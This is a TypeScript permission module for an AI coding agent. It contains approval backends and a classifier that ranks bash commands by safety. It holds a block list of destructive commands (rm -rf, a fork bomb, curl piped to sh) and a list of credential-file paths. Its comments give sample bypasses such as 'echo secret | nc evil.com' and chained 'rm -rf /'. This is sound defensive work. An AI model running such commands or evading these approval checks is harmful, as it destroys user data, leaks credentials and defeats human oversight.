/**
 * Permission system — classifier + approval backend.
 */

import type {
  PermissionDecision,
  PermissionMode,
  PermissionRule,
  ApprovalRequest,
  ApprovalResult,
} from "../types.js";
import { resolve as resolvePath, dirname } from "node:path";
import { existsSync, mkdirSync, readFileSync, writeFileSync, renameSync } from "node:fs";
import { randomUUID } from "node:crypto";
import { logger as rootPermLogger } from "../logging/logger.js";
import { READ_ONLY_TOOLS } from "./plan-mode-allowlist.js";

export interface ApprovalBackend {
  requestApproval(request: ApprovalRequest): Promise<ApprovalResult>;
}

export class HeadlessApprovalBackend implements ApprovalBackend {
  constructor(private readonly mode: "approve-all" | "deny-all" | "approve-read-only") {}

  async requestApproval(req: ApprovalRequest): Promise<ApprovalResult> {
    switch (this.mode) {
      case "approve-all":
        return { approved: true };
      case "deny-all":
        return { approved: false, reason: "headless deny-all mode" };
      case "approve-read-only": {
        if (READ_ONLY_TOOLS.has(req.toolName)) {
          return { approved: true };
        }
        return { approved: false, reason: "read-only mode: write operations denied" };
      }
    }
  }
}

/**
 * Auto approval backend — uses fast-path heuristics to auto-approve safe operations.
 * Falls back to a delegate backend for uncertain cases.
 */
export class AutoApprovalBackend implements ApprovalBackend {
  constructor(private readonly delegate?: ApprovalBackend) {}

  async requestApproval(req: ApprovalRequest): Promise<ApprovalResult> {
    // Fast-path: auto-approve low-risk operations
    if (req.riskLevel === "low") {
      return { approved: true };
    }

    // Deny gate runs BEFORE the safe-prefix fast-path: a high-risk command
    // must never be auto-approved just because it begins with a "safe" verb
    // (e.g. `mkdir /tmp && rm -rf /`). The classifier already flagged it
    // dangerous; honor that first.
    if (req.riskLevel === "high") {
      if (this.delegate) {
        return this.delegate.requestApproval(req);
      }
      return {
        approved: false,
        reason: "auto mode: high-risk operation denied (no interactive approval available)",
      };
    }

    // Auto-approve common safe patterns (only reachable for low/medium risk).
    if (this.isSafeOperation(req)) {
      return { approved: true };
    }

    // Medium risk that is NOT an established-safe operation: delegate if
    // available, otherwise fail CLOSED (matching the high-risk branch and the
    // "auto = approve safe operations only" contract). Auto-approving here
    // would silently run unvetted commands like `kill`, `npm publish`, or
    // unknown binaries.
    if (this.delegate) {
      return this.delegate.requestApproval(req);
    }
    return {
      approved: false,
      reason: "auto mode: medium-risk operation denied (no interactive approval available)",
    };
  }

  private isSafeOperation(req: ApprovalRequest): boolean {
    const { toolName, args } = req;

    // Write/Edit to known safe paths
    if (toolName === "Write" || toolName === "Edit") {
      const filePath = String(args.file_path ?? "");
      // Allow writes to source code, tests, config, docs
      if (
        /\.(ts|js|tsx|jsx|py|rs|go|java|c|cpp|h|css|html|json|yaml|yml|toml|md|txt|sh)$/.test(
          filePath,
        )
      ) {
        return true;
      }
    }

    // Safe bash commands. Reuse the metacharacter-aware classifier instead of
    // a naive startsWith() prefix match — the latter only inspects the first
    // token and is blind to command chaining (`&&`/`||`/`;`), substitution,
    // redirection, and pipe-to-shell, so `mkdir /tmp && rm -rf /` would slip
    // through. classifyBashCommand/scanShellCommand handle all of those.
    if (toolName === "Bash") {
      const cmd = String(args.command ?? "");
      const level = classifyBashCommand(cmd);
      return level === "safe-read" || level === "safe-write";
    }

    return false;
  }
}

interface InteractiveApprovalSessionState {
  allowRules: PermissionRule[];
  denyRules: PermissionRule[];
  promptTurn: Promise<void>;
  cwd: string | null;
  savedProjectRules: PermissionRule[];
  onProjectRules: ((rules: PermissionRule[]) => void) | null;
}

type InteractiveApprovalContextState = Pick<
  InteractiveApprovalSessionState,
  "cwd" | "savedProjectRules" | "onProjectRules"
>;

/**
 * Closed-session tombstones are a bounded replay guard. A prompt that started
 * before close is still protected by the state-object identity check in
 * isActiveSessionState(): clearSession deletes the captured state, so the late
 * result cannot write into a new bucket even if an old tombstone has aged out.
 * The tombstone only blocks fresh post-close calls carrying a recently closed
 * sessionId from creating an empty bucket. 4096 is 256x the default
 * ChatSessionManager.maxSessions (16), which covers normal late-result bursts
 * while keeping long-lived processes from retaining every historical id.
 */
export const CLOSED_SESSION_TOMBSTONE_LIMIT = 4096;

/**
 * Interactive approval backend — prompts the user via a callback.
 *
 * Stores "always allow" decisions at two scopes:
 *   - session: in-memory map, lost when the process exits
 *   - project: persisted to <cwd>/.code-shell/settings.local.json so the
 *              same project remembers the rule across REPL restarts
 *
 * The classifier reads project rules from settings on session start (see
 * Engine.buildPermissionConfig), so persisted rules become "auto-allow"
 * the next time the user opens the project.
 */
export class InteractiveApprovalBackend implements ApprovalBackend {
  // Session-scoped grants are bucketed by ApprovalRequest.sessionId and then
  // keyed on the OPERATION (tool + narrowed argsPattern via buildProjectRule),
  // NOT just the tool name. Approving `git status` for one session must not
  // auto-allow either `rm -rf /` in that same session or `git ...` in another.
  // Allow and deny are tracked separately so a one-off deny of `curl evil`
  // never blocks an unrelated `git status`.
  private sessionStateById = new Map<string, InteractiveApprovalSessionState>();
  private closedSessionIds = new Set<string>();
  private promptFn: ((request: ApprovalRequest) => Promise<ApprovalResult>) | null = null;
  private legacyPromptTurn: Promise<void> = Promise.resolve();
  private legacyContext: InteractiveApprovalContextState = {
    cwd: null,
    savedProjectRules: [],
    onProjectRules: null,
  };

  setPromptFn(fn: (request: ApprovalRequest) => Promise<ApprovalResult>): void {
    this.promptFn = fn;
  }

  /**
   * Has someone installed a real prompt callback? Engine consults this
   * to decide whether to use the interactive backend (= talk to a UI)
   * or fall back to HeadlessApprovalBackend (= deny-all). Without it,
   * the agent-server-stdio entry — which wires setInteractiveApprovalFn
   * during server boot — would still fall through to deny-all because
   * the engine couldn't tell the difference. */
  hasPromptFn(): boolean {
    return this.promptFn !== null;
  }

  /** Inject the project root so persistence writes to the right settings file. */
  setCwd(cwd: string): void {
    this.legacyContext.cwd = cwd;
  }

  /**
   * Inject a callback fired when the user approves "for this project". The
   * callback receives the *full* accumulated list of project rules saved in
   * this session, so the classifier can be reconfigured without losing
   * earlier approvals.
   */
  setOnProjectRules(fn: (rules: PermissionRule[]) => void): void {
    this.legacyContext.onProjectRules = fn;
  }

  setSessionContext(
    sessionId: string,
    context: { cwd: string; onProjectRules: (rules: PermissionRule[]) => void },
  ): void {
    const state = this.getSessionState(sessionId, true);
    if (!state) return;
    state.cwd = context.cwd;
    state.onProjectRules = context.onProjectRules;
  }

  openSession(sessionId: string): void {
    if (!sessionId) return;
    this.closedSessionIds.delete(sessionId);
  }

  clearSession(sessionId: string): void {
    if (!sessionId) return;
    this.sessionStateById.delete(sessionId);
    this.rememberClosedSession(sessionId);
  }

  private rememberClosedSession(sessionId: string): void {
    this.closedSessionIds.delete(sessionId);
    this.closedSessionIds.add(sessionId);
    while (this.closedSessionIds.size > CLOSED_SESSION_TOMBSTONE_LIMIT) {
      const oldest = this.closedSessionIds.values().next().value;
      if (oldest === undefined) break;
      this.closedSessionIds.delete(oldest);
    }
  }

  private makeSessionState(): InteractiveApprovalSessionState {
    return {
      allowRules: [],
      denyRules: [],
      promptTurn: Promise.resolve(),
      cwd: null,
      savedProjectRules: [],
      onProjectRules: null,
    };
  }

  private getSessionState(
    sessionId: string | undefined,
    create: boolean,
  ): InteractiveApprovalSessionState | null {
    if (!sessionId) return null;
    if (this.closedSessionIds.has(sessionId)) return null;
    const existing = this.sessionStateById.get(sessionId);
    if (existing || !create) return existing ?? null;
    const next = this.makeSessionState();
    this.sessionStateById.set(sessionId, next);
    return next;
  }

  private isActiveSessionState(
    sessionId: string | undefined,
    state: InteractiveApprovalSessionState | null,
  ): state is InteractiveApprovalSessionState {
    return (
      !!sessionId &&
      !!state &&
      !this.closedSessionIds.has(sessionId) &&
      this.sessionStateById.get(sessionId) === state
    );
  }

  async requestApproval(req: ApprovalRequest): Promise<ApprovalResult> {
    const state = this.getSessionState(req.sessionId, true);

    // Fast path: the operation may already be covered by a session rule.
    const cached = state ? this.checkSessionRules(req, state) : null;
    if (cached) return cached;

    if (!this.promptFn) {
      return { approved: false, reason: "interactive approval backend has no prompt function" };
    }

    // Serialize prompts and re-check rules when our turn comes (see promptTurn
    // field doc): a burst of parallel tool calls all passes the fast path
    // before the first decision lands; without the re-check the user had to
    // answer one card per duplicate.
    const prevTurn = state ? state.promptTurn : this.legacyPromptTurn;
    let release!: () => void;
    const currentTurn = new Promise<void>((r) => (release = r));
    if (state) {
      state.promptTurn = currentTurn;
    } else {
      this.legacyPromptTurn = currentTurn;
    }
    try {
      await prevTurn;
      const activeState = this.isActiveSessionState(req.sessionId, state) ? state : null;
      const nowCached = activeState ? this.checkSessionRules(req, activeState) : null;
      if (nowCached) return nowCached;
      return await this.promptAndRecord(req, activeState);
    } finally {
      release();
    }
  }

  /** Session-rule lookup — operation-scoped (see sessionStateById doc). Deny
   *  wins over allow if both somehow match (conservative). Null = no rule. */
  private checkSessionRules(
    req: ApprovalRequest,
    state: InteractiveApprovalSessionState,
  ): ApprovalResult | null {
    if (state.denyRules.some((r) => ruleMatches(r, req.toolName, req.args))) {
      return { approved: false };
    }
    if (state.allowRules.some((r) => ruleMatches(r, req.toolName, req.args))) {
      return { approved: true };
    }
    return null;
  }

  /** The actual interactive ask + rule recording (runs inside the prompt turn). */
  private async promptAndRecord(
    req: ApprovalRequest,
    state: InteractiveApprovalSessionState | null,
  ): Promise<ApprovalResult> {
    if (!this.promptFn) {
      return { approved: false, reason: "interactive approval backend has no prompt function" };
    }
    const result = await this.promptFn(req);
    const scope = result.scope ?? (result.always ? "session" : "once");
    const activeState = this.isActiveSessionState(req.sessionId, state) ? state : null;
    const context = activeState ?? (!req.sessionId ? this.legacyContext : null);

    // Path narrowing only rides on an APPROVE: a path-scoped deny is confusing
    // (deny stays tool-wide). pathScope is ignored by buildProjectRule for
    // non-file tools / when absent.
    const ruleOpts = result.approved
      ? { pathScope: result.pathScope, cwd: context?.cwd ?? undefined }
      : undefined;

    if (scope === "session" && result.always) {
      if (!activeState) {
        rootPermLogger.warn("permission.session_remember_ignored", {
          cat: "permission",
          tool: req.toolName,
          reason: req.sessionId ? "session_closed" : "missing_session_id",
        });
        return result;
      }
      // Narrow to the operation (Bash → head command, file tools → path scope)
      // so the session grant is scoped, not tool-wide. A rule with no
      // argsPattern keeps the prior tool-granularity behavior.
      const rule = buildProjectRule(req.toolName, req.args, ruleOpts);
      if (rule) {
        const target = result.approved ? activeState.allowRules : activeState.denyRules;
        const dup = target.some(
          (r) =>
            r.tool === rule.tool &&
            JSON.stringify(r.argsPattern) === JSON.stringify(rule.argsPattern),
        );
        if (!dup) {
          // buildProjectRule always returns decision:"allow"; flip for deny.
          target.push(result.approved ? rule : { ...rule, decision: "deny" });
        }
      }
    } else if (scope === "project" && result.approved) {
      // Project-scope: persist a PermissionRule to settings.local.json.
      // We only persist allow rules — denies stay session-only because a
      // persisted deny is harder to recover from than a session deny.
      const rule = buildProjectRule(req.toolName, req.args, ruleOpts);
      if (rule && context?.cwd) {
        try {
          persistProjectRule(context.cwd, rule);
          // Dedup against the in-memory list using the same equality used by
          // persistProjectRule so re-prompts on the same tool/argsPattern
          // don't bloat the live rule set.
          const dup = context.savedProjectRules.some(
            (r) =>
              r.tool === rule.tool &&
              r.decision === rule.decision &&
              JSON.stringify(r.argsPattern) === JSON.stringify(rule.argsPattern),
          );
          if (!dup) context.savedProjectRules.push(rule);
          context.onProjectRules?.(context.savedProjectRules);
          rootPermLogger.info("permission.persist", {
            cat: "permission",
            tool: rule.tool,
            decision: rule.decision,
            totalProjectRules: context.savedProjectRules.length,
            duplicate: dup,
          });
        } catch (err) {
          rootPermLogger.error("permission.persist_failed", {
            cat: "permission",
            tool: rule.tool,
            error: (err as Error).message,
          });
          // eslint-disable-next-line no-console
          console.error("Failed to persist project permission rule:", (err as Error).message);
        }
      }
      // Also seed the session allow list (operation-scoped) so the rest of
      // this REPL session benefits even if the classifier path doesn't pick
      // the rule up immediately.
      if (rule && activeState) {
        const dup = activeState.allowRules.some(
          (r) =>
            r.tool === rule.tool &&
            JSON.stringify(r.argsPattern) === JSON.stringify(rule.argsPattern),
        );
        if (!dup) activeState.allowRules.push(rule);
      }
    }

    return result;
  }
}

/** File tools whose approvals can be narrowed to a path prefix. */
const PATH_SCOPED_TOOLS: ReadonlySet<string> = new Set(["Write", "Edit"]);

/**
 * Build the `file_path` argsPattern that narrows a remembered file-tool grant
 * to a path scope. Pure: takes an ALREADY-RESOLVED absolute path (the caller
 * normalizes against cwd so `../` can't slip past the prefix) and the scope.
 *
 *   "file" → `^<esc(abs)>$`         only this exact file
 *   "dir"  → `^<esc(dir(abs))>/`    this file's directory + subdirectories
 *   "tool" → null                   no narrowing (tool-wide; legacy behavior)
 *
 * The dir form keeps a trailing slash so `/repo/src/` can't match a sibling
 * like `/repo/src-secret/x.ts`. Regex metacharacters in the path are escaped.
 */
export function pathRuleArgsPattern(
  absPath: string,
  scope: "file" | "dir" | "tool",
): { file_path: string } | null {
  if (scope === "tool") return null;
  if (scope === "file") return { file_path: `^${escapeRegex(absPath)}$` };
  // dir: strip the basename, ensure a single trailing slash, anchor as prefix.
  const slash = absPath.lastIndexOf("/");
  const dir = slash > 0 ? absPath.slice(0, slash) : absPath;
  return { file_path: `^${escapeRegex(dir + "/")}` };
}

/**
 * Build a PermissionRule from a single approval. Bash narrows to the head
 * command (first whitespace token) so "git status" → allow all `git ...`.
 *
 * File tools (Write/Edit) narrow to a PATH scope when `opts.pathScope` is
 * "file"/"dir": "allow Write src/foo.ts for this session" then means exactly
 * that file (or its directory), NOT every path. Without a pathScope (or
 * "tool"), they keep the legacy tool-wide grant. Paths are resolved against
 * `opts.cwd` first so `../` can't widen the prefix. Other tools stay tool-wide.
 */
function buildProjectRule(
  toolName: string,
  args: Record<string, unknown>,
  opts?: { pathScope?: "file" | "dir" | "tool"; cwd?: string },
): PermissionRule | null {
  if (toolName === "Bash") {
    const cmd = String(args.command ?? "").trim();
    const head = cmd.split(/\s+/)[0];
    if (!head) return null;
    return {
      tool: "Bash",
      argsPattern: { command: `^${escapeRegex(head)}(\\s|$)` },
      decision: "allow",
      reason: `Allowed via permission prompt: ${head}`,
    };
  }

  if (PATH_SCOPED_TOOLS.has(toolName) && opts?.pathScope && opts.pathScope !== "tool") {
    const raw = String(args.file_path ?? "");
    if (raw) {
      // Resolve against cwd so a relative or `../`-laden path becomes the real
      // absolute path the prefix anchors to.
      const abs = resolvePath(opts.cwd ?? process.cwd(), raw);
      const argsPattern = pathRuleArgsPattern(abs, opts.pathScope);
      if (argsPattern) {
        return {
          tool: toolName,
          argsPattern,
          decision: "allow",
          reason: `Allowed via permission prompt: ${toolName} ${opts.pathScope === "dir" ? dirname(abs) + "/" : abs}`,
        };
      }
    }
  }

  return {
    tool: toolName,
    decision: "allow",
    reason: "Allowed via permission prompt",
  };
}

function escapeRegex(s: string): string {
  return s.replace(/[.*+?^${}()|[\]\\]/g, "\\$&");
}

/**
 * Does `rule` match this tool call? Shared by the {@link PermissionClassifier}
 * (project/user rules) and {@link InteractiveApprovalBackend}'s session cache
 * so the two never diverge on what "the same operation" means. Handles the
 * JSON round-trip where a persisted RegExp comes back as a string.
 */
export function ruleMatches(
  rule: PermissionRule,
  toolName: string,
  args: Record<string, unknown>,
): boolean {
  if (rule.tool !== toolName && rule.tool !== "*") return false;
  if (!rule.argsPattern) return true;
  // A Bash allow-rule is narrowed to a HEAD command (e.g. `^git(\s|$)`), but a
  // raw regex test would let a chained command smuggle a dangerous tail past a
  // grant for its head: `git status && rm -rf /` starts with `git `, so the
  // grant for `git status` would otherwise auto-allow the whole thing. A
  // head-narrowed grant must only cover a SINGLE, non-dangerous command — if the
  // candidate chains (`&&`/`||`/`;`), pipes (`| sh`), or uses substitution/
  // redirection, refuse the match so it re-prompts. (We only gate narrowed Bash
  // grants; a tool-wide `*`/no-pattern rule, or an explicit user `argsPattern`,
  // is the user's own choice and untouched.)
  if (toolName === "Bash" && rule.tool === "Bash" && rule.argsPattern.command) {
    const cmd = String(args.command ?? "");
    const scan = scanShellCommand(cmd);
    // scanShellCommand flags `;`/`&&`/`||`/substitution/redirection (multi-segment
    // or dangerous), but a single pipe stays IN-segment (it's per-segment data
    // flow, not a statement boundary) — so `git log | sh` is one non-dangerous
    // segment. A head grant must not cover a pipe either: reject any segment
    // carrying an (unquoted-enough) pipe so pipe-to-shell can't ride the grant.
    if (scan.dangerous || scan.segments.length > 1 || scan.segments.some((s) => s.includes("|"))) {
      return false;
    }
  }
  for (const [key, pattern] of Object.entries(rule.argsPattern)) {
    const argVal = String(args[key] ?? "");
    if (pattern instanceof RegExp) {
      if (!pattern.test(argVal)) return false;
    } else if (typeof pattern === "string") {
      const looksLikeRegex = /[\\^$.*+?()[\]|{}]/.test(pattern);
      if (looksLikeRegex) {
        let re: RegExp;
        try {
          re = new RegExp(pattern);
        } catch {
          if (!argVal.includes(pattern)) return false;
          continue;
        }
        if (!re.test(argVal)) return false;
      } else if (!argVal.includes(pattern)) {
        return false;
      }
    }
  }
  return true;
}

/**
 * Append a rule to <cwd>/.code-shell/settings.local.json. Local file because
 * permission grants are per-developer and shouldn't be checked into git.
 * Idempotent: skips if an equivalent rule is already present.
 */
function persistProjectRule(cwd: string, rule: PermissionRule): void {
  const dir = `${cwd}/.code-shell`;
  const file = `${dir}/settings.local.json`;

  // Don't resurrect a deleted project root: a recursive mkdir of
  // <cwd>/.code-shell recreates `cwd` itself as an empty shell when cwd is gone.
  // Persistence here is best-effort, so skip when the root is missing.
  if (!existsSync(cwd)) return;
  if (!existsSync(dir)) mkdirSync(dir, { recursive: true });

  let settings: { permissions?: { rules?: PermissionRule[] } } = {};
  if (existsSync(file)) {
    try {
      settings = JSON.parse(readFileSync(file, "utf-8"));
    } catch {
      /* start fresh on parse error */
    }
  }
  if (!settings.permissions) settings.permissions = {};
  if (!settings.permissions.rules) settings.permissions.rules = [];

  // Dedup: same tool + same argsPattern.command (or no pattern) is a match
  const exists = settings.permissions.rules.some(
    (r) =>
      r.tool === rule.tool &&
      r.decision === "allow" &&
      JSON.stringify(r.argsPattern) === JSON.stringify(rule.argsPattern),
  );
  if (exists) return;

  settings.permissions.rules.push(rule);
  // Atomic write: stage to .tmp, then rename, so a crash mid-write can't
  // truncate settings.local.json and lose every saved permission grant.
  // randomUUID() (not pid+Date.now()) guards against temp-name collisions when
  // two writers fire within the same millisecond.
  const tmp = `${file}.${randomUUID()}.tmp`;
  writeFileSync(tmp, JSON.stringify(settings, null, 2) + "\n", "utf-8");
  renameSync(tmp, file);
}

// Singleton interactive backend for use by the UI
let _interactiveBackend: InteractiveApprovalBackend | null = null;

export function getInteractiveApprovalBackend(): InteractiveApprovalBackend {
  if (!_interactiveBackend) {
    _interactiveBackend = new InteractiveApprovalBackend();
  }
  return _interactiveBackend;
}

export function openInteractiveApprovalSession(sessionId: string): void {
  getInteractiveApprovalBackend().openSession(sessionId);
}

export function clearInteractiveApprovalSession(sessionId: string): void {
  getInteractiveApprovalBackend().clearSession(sessionId);
}

export function setInteractiveApprovalFn(
  fn: (request: ApprovalRequest) => Promise<ApprovalResult>,
): void {
  getInteractiveApprovalBackend().setPromptFn(fn);
}

// ─── YOLO Classifier — categorize bash commands by safety level ───

type BashSafetyLevel = "safe-read" | "safe-write" | "unsafe" | "dangerous";

const DANGEROUS_PATTERNS = [
  /rm\s+-rf/,
  /rm\s+-r\s+\//,
  />\s*\/dev\/sd/,
  /mkfs\./,
  /dd\s+if=/,
  /:(){ :|:& };:/,
  /chmod\s+-R\s+777/,
  /curl.*\|\s*(ba)?sh/,
  /wget.*\|\s*(ba)?sh/,
  /git\s+push\s+--force/,
  /git\s+reset\s+--hard/,
  /git\s+clean\s+-[fd]/,
  />\s*\/etc\//,
  /sudo\s+rm/,
  /pkill\s+-9/,
  /kill\s+-9/,
  /shutdown/,
  /reboot/,
  /systemctl\s+(stop|disable|mask)/,
  /DROP\s+(TABLE|DATABASE)/i,
  /TRUNCATE\s+TABLE/i,
];

const SAFE_READ_PATTERNS = [
  /^(cat|head|tail|less|more|wc|file|stat|du|df)\s/,
  /^(ls|tree|locate|which|whereis|type)\s/,
  // `find` is read-only ONLY without an action that executes or mutates:
  // -delete, -exec/-execdir/-ok/-okdir run commands; -fprint/-fprintf/-fls
  // write files. Reject those so `find . -delete` / `find . -exec rm {} +`
  // are NOT classified safe-read. Plain predicates (-name, -type, -print) stay.
  /^find\s(?!.*\s-(delete|exec(dir)?|ok(dir)?|fprintf?|fls)\b)/,
  /^(grep|rg|ag|ack|fgrep|egrep)\s/,
  // Word-boundary the git read subcommands so `git difftool -x <cmd>` (which
  // runs an arbitrary external command) does NOT match on the `diff` branch.
  /^(git\s+(status|log|diff|branch|show|blame|remote|tag|stash\s+list|rev-parse|describe))\b/,
  /^(node|python|ruby|go|rustc|java|javac)\s+--version/,
  /^(npm|pnpm|yarn|cargo|pip|gem|brew)\s+(list|ls|info|show|view|outdated|audit)/,
  /^pwd$/,
  /^whoami$/,
  /^date$/,
  /^(uname|hostname|id)\b/,
  /^echo\s/,
  /^env$/,
  /^printenv/,
];

// ─── Sensitive safe-read downgrade ────────────────────────────────
//
// `Read ~/.ssh/id_rsa` routes through path-policy (asks); the equivalent
// `cat ~/.ssh/id_rsa` was YOLO-classified safe-read and auto-allowed with the
// desktop's default sandbox=off — a zero-approval credential exfil channel.
// A segment that would otherwise be safe-read is downgraded to `unsafe` (→
// ask) when it dumps the process env or its arguments touch a sensitive path.
// Conservative-and-narrow: only known credential/secret shapes trip it, so
// ordinary reads (README.md, src/*.ts) stay safe-read.

// Whole-command env dumps that leak Credential.exposeAsEnv / top-level `env`
// API keys. `env FOO=bar cmd` (env used as a launcher) is intentionally NOT
// matched — only a bare dump.
const ENV_DUMP_RE = /^(env|printenv)(\s+[A-Za-z_][A-Za-z0-9_]*)*\s*$/;

const SENSITIVE_PATH_PATTERNS = [
  /\.ssh\//, // ~/.ssh/id_rsa, authorized_keys, known_hosts
  /(^|\/)id_(rsa|dsa|ecdsa|ed25519)\b/,
  /(^|\/|\s)\.env(\.[A-Za-z0-9]|\b)/, // .env, .env.local, .env.production
  /\.aws\/credentials\b/,
  /\.code-shell\/credentials\b/,
  /credentials\.json\b/,
  /\.npmrc\b/,
  /\.netrc\b/,
  /\.pgpass\b/,
  /\.docker\/config\.json\b/,
  /\.kube\/config\b/,
  /\.config\/gh\/hosts\b/,
  /\.gnupg\//,
  /(^|\/)\.git-credentials\b/,
];

/**
 * True when an otherwise-safe-read shell segment must be downgraded to `unsafe`
 * because it dumps the environment or reads a sensitive credential/secret path.
 * Exported for direct unit testing of the predicate.
 */
export function segmentIsSensitiveRead(segment: string): boolean {
  const s = segment.trim();
  if (ENV_DUMP_RE.test(s)) return true;
  return SENSITIVE_PATH_PATTERNS.some((re) => re.test(s));
}

const SAFE_WRITE_PATTERNS = [
  /^(git\s+(add|commit|stash\s+(save|push)))/,
  /^mkdir\s/,
  /^touch\s/,
  /^(npm|pnpm|yarn)\s+(install|add|remove|uninstall|run|test|build|lint|format)/,
  /^(cargo|go|pip|gem)\s+(build|test|install|run|fmt|clippy|vet)/,
  /^(tsc|eslint|prettier|vitest|jest|mocha|pytest)\b/,
  /^make\b/,
  /^(cp|mv)\s/,
];

// ─── Shell metacharacter scanner ──────────────────────────────────
//
// A1 hardening: classifyBashCommand previously ran SAFE_READ_PATTERNS
// against the whole command string, so `ls -la; rm -rf /` would
// match /^ls\s/ and be returned as safe-read. We now scan the command
// once with quote/escape awareness:
//
//   - top-level `;`, `&&`, `||`, newline split the command into
//     segments. Every segment must independently classify as safe
//     for the whole command to be safe.
//   - unquoted command substitution (` ` ` or `$(` ), redirection
//     (`>` `>>` `<` `<<`), process substitution (`<(` `>(`), and
//     pipe-to-shell (`| sh`, `| bash`, ...) flag the command as
//     dangerous.
//   - quoted (`'…'`, `"…"`) and backslash-escaped characters are
//     ignored — `echo "a; b"` is a single segment.
//
// This is intentionally detection-only, not a full shell parser. We
// only need to find unquoted metacharacters and split safely.

const PIPE_TO_SHELL_RE =
  /\|\s*(sh|bash|zsh|dash|ksh|fish|python|python3|node|nodejs|ruby|perl|php)\b/;

interface ScanResult {
  segments: string[];
  dangerous: boolean;
}

function scanShellCommand(input: string): ScanResult {
  const segments: string[] = [];
  let buf = "";
  let dangerous = false;
  let i = 0;
  // Track top-level quote state. We do NOT recurse into nested
  // command substitutions for classification — the presence of `$(`
  // or backticks already marks the command dangerous.
  let quote: "'" | '"' | null = null;

  const flush = () => {
    const s = buf.trim();
    if (s.length > 0) segments.push(s);
    buf = "";
  };

  while (i < input.length) {
    const ch = input[i];
    const next = input[i + 1];

    if (quote === null) {
      // Escape: skip the next character
      if (ch === "\\" && next !== undefined) {
        buf += ch + next;
        i += 2;
        continue;
      }
      // Enter quote
      if (ch === "'" || ch === '"') {
        quote = ch;
        buf += ch;
        i++;
        continue;
      }
      // Command substitution: backtick or $(
      if (ch === "`" || (ch === "$" && next === "(")) {
        dangerous = true;
        buf += ch;
        i++;
        continue;
      }
      // Process substitution: <( or >(
      if ((ch === "<" || ch === ">") && next === "(") {
        dangerous = true;
        buf += ch;
        i++;
        continue;
      }
      // Redirection
      if (ch === ">" || ch === "<") {
        dangerous = true;
        buf += ch;
        i++;
        continue;
      }
      // Top-level separators
      if (ch === ";" || ch === "\n") {
        flush();
        i++;
        continue;
      }
      if ((ch === "&" && next === "&") || (ch === "|" && next === "|")) {
        flush();
        i += 2;
        continue;
      }
      // Background `&` is treated like `;`
      if (ch === "&") {
        flush();
        i++;
        continue;
      }
      buf += ch;
      i++;
      continue;
    }

    // Inside a quote
    if (ch === "\\" && next !== undefined) {
      buf += ch + next;
      i += 2;
      continue;
    }
    if (ch === quote) {
      quote = null;
      buf += ch;
      i++;
      continue;
    }
    buf += ch;
    i++;
  }

  flush();
  // An unclosed quote means we stopped recognizing separators/metacharacters
  // partway through (pipes, `;`, redirection inside the dangling quote were
  // swallowed). Treat malformed shell syntax as dangerous rather than risk
  // misclassifying it as safe.
  if (quote !== null) dangerous = true;
  return { segments, dangerous };
}

function classifySegment(segment: string): BashSafetyLevel {
  if (DANGEROUS_PATTERNS.some((p) => p.test(segment))) return "dangerous";

  // Pipe handling FIRST: every command in the pipe must independently
  // classify as safe-read for the segment to count as safe-read. This has to
  // run before the whole-segment SAFE_READ/SAFE_WRITE match below, because
  // those patterns are head-anchored (e.g. /^echo\s/) and would match
  // `echo secret | nc evil.com` on its `echo ` head while ignoring the
  // `| nc ...` exfil tail — declaring a piped-to-network command safe-read.
  // We did not split on `|` in the scanner because pipes are not statement
  // boundaries; they're per-segment data flow.
  if (segment.includes("|")) {
    // A pipe part may be an argument-less command (`ls`, `pwd`) whose trailing
    // space was stripped along with the `|`. Test each part both as-is (for
    // `$`-anchored patterns like /^pwd$/) and with a trailing space appended
    // (for `\s`-delimited patterns like /^ls\s/), so neither form is missed.
    const parts = segment.split("|").map((p) => p.trim());
    const partIsSafeRead = (p: string) =>
      SAFE_READ_PATTERNS.some((re) => re.test(p) || re.test(`${p} `));
    if (parts.every(partIsSafeRead)) {
      // A sensitive read anywhere in the pipe (`cat ~/.ssh/id_rsa | base64`,
      // `env | grep KEY`) downgrades the whole pipe.
      if (parts.some(segmentIsSensitiveRead)) return "unsafe";
      return "safe-read";
    }
    return "unsafe";
  }

  if (SAFE_READ_PATTERNS.some((p) => p.test(segment))) {
    return segmentIsSensitiveRead(segment) ? "unsafe" : "safe-read";
  }
  if (SAFE_WRITE_PATTERNS.some((p) => p.test(segment))) return "safe-write";
  return "unsafe";
}

const SAFETY_RANK: Record<BashSafetyLevel, number> = {
  "safe-read": 3,
  "safe-write": 2,
  unsafe: 1,
  dangerous: 0,
};

function minSafety(a: BashSafetyLevel, b: BashSafetyLevel): BashSafetyLevel {
  return SAFETY_RANK[a] <= SAFETY_RANK[b] ? a : b;
}

export function classifyBashCommand(command: string): BashSafetyLevel {
  const trimmed = command.trim();
  if (trimmed.length === 0) return "unsafe";

  // Whole-command dangerous patterns (e.g. `curl ... | sh`) need to
  // be checked against the raw text because some of them span
  // separators we would split on.
  if (DANGEROUS_PATTERNS.some((p) => p.test(trimmed))) return "dangerous";
  if (PIPE_TO_SHELL_RE.test(trimmed)) return "dangerous";

  const scan = scanShellCommand(trimmed);
  if (scan.dangerous) return "dangerous";
  if (scan.segments.length === 0) return "unsafe";

  // Every top-level segment must independently classify. The whole
  // command's safety is the minimum across segments.
  let overall: BashSafetyLevel = "safe-read";
  for (const seg of scan.segments) {
    overall = minSafety(overall, classifySegment(seg));
    if (overall === "dangerous") return "dangerous";
  }
  return overall;
}

// ─── Denial Tracker — rate limit repeated denials ────────────────

interface DenialRecord {
  count: number;
  firstAt: number;
  lastAt: number;
}

export class DenialTracker {
  private denials = new Map<string, DenialRecord>();
  private readonly periodMs: number;
  private readonly maxDenials: number;

  constructor(opts?: { periodMs?: number; maxDenials?: number }) {
    this.periodMs = opts?.periodMs ?? 60 * 60 * 1000; // 1 hour
    this.maxDenials = opts?.maxDenials ?? 5;
  }

  record(toolName: string): void {
    const now = Date.now();
    const existing = this.denials.get(toolName);
    if (existing && now - existing.firstAt < this.periodMs) {
      existing.count++;
      existing.lastAt = now;
    } else {
      this.denials.set(toolName, { count: 1, firstAt: now, lastAt: now });
    }
  }

  recordSuccess(toolName: string): void {
    this.denials.delete(toolName);
  }

  shouldWarn(toolName: string): boolean {
    const record = this.denials.get(toolName);
    if (!record) return false;
    if (Date.now() - record.firstAt > this.periodMs) {
      this.denials.delete(toolName);
      return false;
    }
    return record.count >= this.maxDenials;
  }

  getWarningMessage(toolName: string): string {
    const record = this.denials.get(toolName);
    if (!record) return "";
    return (
      `Tool "${toolName}" has been denied ${record.count} times in the last hour. ` +
      `Please stop attempting this tool and try an alternative approach.`
    );
  }

  clear(): void {
    this.denials.clear();
  }
}

